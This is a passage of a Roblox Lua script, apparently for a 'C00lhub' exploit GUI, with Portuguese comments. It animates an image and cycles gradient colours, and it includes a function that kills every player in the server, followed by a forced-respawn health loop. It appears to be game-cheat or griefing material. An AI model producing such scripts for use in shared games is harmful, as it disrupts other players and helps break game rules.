Cleitinho.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Cleitinho.BackgroundTransparency = 1.000
Cleitinho.BorderColor3 = Color3.fromRGB(255, 255, 255)
Cleitinho.Position = UDim2.new(-0.00504570268, 0, -0.00311489752, 0)
Cleitinho.Rotation = -9.479
Cleitinho.Size = UDim2.new(0, 157, 0, 145)
Cleitinho.Image = "http://www.roblox.com/asset/?id=81917071074086"

local TweenService = game:GetService("TweenService")
local Player = game.Players.LocalPlayer
local ImageLabel = Player:WaitForChild("PlayerGui"):WaitForChild("C00lhubV1"):WaitForChild("PaiDaFrame"):WaitForChild("FramePrincipal"):WaitForChild("c00lkidd"):WaitForChild("c00lkidd:)"):FindFirstChild("Cleitinho") -- Substitua pelo nome real

if ImageLabel then
	local tweenInfo = TweenInfo.new(
		1, -- Duração da animação (1 segundo)
		Enum.EasingStyle.Sine, -- Tipo de animação suave
		Enum.EasingDirection.InOut, -- Direção da animação
		-1, -- Repetir infinitamente
		true -- Inverter o movimento
	)

	local goal = {Rotation = 20} -- Define a rotação máxima para um lado
	local tween = TweenService:Create(ImageLabel, tweenInfo, goal)
	tween:Play()
else
	warn("ImageLabel não encontrado!")
end

local Players = game:GetService("Players")

-- Função para matar todos os jogadores
local function killAllPlayers()
	for _, player in pairs(Players:GetPlayers()) do
		if player.Character and player.Character:FindFirstChild("Humanoid") then
			player.Character:FindFirstChild("Humanoid"):TakeDamage(player.Character.Humanoid.Health) -- Mata o jogador
		end
	end
end

-- Função para dar vida infinita aos jogadores
local function giveInfiniteHealth(player)
	player.CharacterAdded:Connect(function(character)
		local humanoid = character:WaitForChild("Humanoid")

		-- Define a vida do humanoide como infinita
		humanoid.HealthChanged:Connect(function()
			if humanoid.Health <= 0 then
				humanoid.Health = humanoid.MaxHealth -- Restaura a vida do jogador
			end
		end)

		-- Garantir que a vida seja definida como infinita ao iniciar o jogo
		humanoid.Health = humanoid.MaxHealth
	end)
end

-- Mata todos os jogadores
killAllPlayers()

-- Dá vida infinita para os jogadores que entrarem ou renascerem
Players.PlayerAdded:Connect(function(player)
	giveInfiniteHealth(player)
end)

-- Dá vida infinita aos jogadores que já estão no jogo
for _, player in pairs(Players:GetPlayers()) do
	giveInfiniteHealth(player)
end

local RunService = game:GetService("RunService")

-- Função para encontrar automaticamente todos os UIGradients na interface
local function findUIGradients()
	local gradients = {}
	for _, gui in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
		if gui:IsA("UIGradient") then
			table.insert(gradients, gui)
		end
	end
	return gradients
end

local gradients = findUIGradients()

if #gradients == 0 then
	warn("Nenhum UIGradient encontrado na interface!")
	return
end

local rotationSpeed = 90 -- Velocidade de rotação (graus por segundo)
local colorChangeSpeed = 20 -- Velocidade da transição de cores RGB

-- Função para girar todos os UIGradients infinitamente
local function rotateGradients()
	RunService.RenderStepped:Connect(function(deltaTime)
		for _, gradient in pairs(gradients) do
			gradient.Rotation = (gradient.Rotation + rotationSpeed * deltaTime) % 360
		end
	end)
end

-- Função para mudar as cores no padrão RGB
local function rgbCycle()
	local t = 0
	while true do
		t = t + colorChangeSpeed * RunService.RenderStepped:Wait()

		-- Gera cores no padrão RGB usando seno e cosseno para suavidade
		local r = math.sin(t) * 127 + 128
		local g = math.sin(t + 2) * 127 + 128
		local b = math.sin(t + 4) * 127 + 128

		local colorSequence = ColorSequence.new{
			ColorSequenceKeypoint.new(0, Color3.fromRGB(r, g, b)),
			ColorSequenceKeypoint.new(1, Color3.fromRGB(b, r, g))
		}

		-- Aplica a cor a todos os UIGradients
		for _, gradient in pairs(gradients) do
			gradient.Color = colorSequence
		end
		wait(0.1) -- Espera para garantir a suavidade do ciclo de cores
	end
end

-- Inicia as funções
rotateGradients()
task.spawn(rgbCycle)
